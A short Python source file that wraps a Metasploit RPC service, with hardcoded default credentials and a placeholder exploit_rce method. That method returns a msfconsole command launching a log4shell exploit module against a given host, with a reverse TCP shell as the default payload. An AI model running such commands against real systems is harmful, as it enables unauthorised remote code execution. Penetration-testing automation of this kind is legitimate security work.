import httpx
import json

class MetasploitRPC:
    def __init__(self, config):
        self.host = config.get('host', '127.0.0.1')
        self.port = config.get('port', 55553)
        self.user = config.get('user', 'msf')
        self.password = config.get('password', 'msf_password')
        self.token = None
        self.authenticated = False

    async def _authenticate(self):
        url = f"http://{self.host}:{self.port}/api/v1/auth/login"
        async with httpx.AsyncClient() as client:
            resp = await client.post(url, json={"username": self.user, "password": self.password})
            if resp.status_code == 200:
                self.token = resp.json().get('token')
                self.authenticated = True
        return self.authenticated

    async def _call(self, method: str, args: dict = None):
        if not self.authenticated:
            await self._authenticate()
        if not self.authenticated:
            return {"error": "Authentication failed"}
        url = f"http://{self.host}:{self.port}/api/v1/{method}"
        headers = {"Authorization": f"Bearer {self.token}"}
        async with httpx.AsyncClient() as client:
            resp = await client.post(url, json=args or {}, headers=headers)
            return resp.json()

    async def exploit_rce(self, target: str, port: int, payload: str = "linux/x64/shell_reverse_tcp"):
        if not self.authenticated:
            await self._authenticate()
        if not self.authenticated:
            return {"error": "Authentication failed"}
        # Placeholder – real integration would use pymetasploit3
        return {
            "status": "triggered",
            "payload": payload,
            "target": target,
            "command": f"msfconsole -x 'use exploit/multi/http/log4shell_header; set RHOSTS {target}; run'"
        }
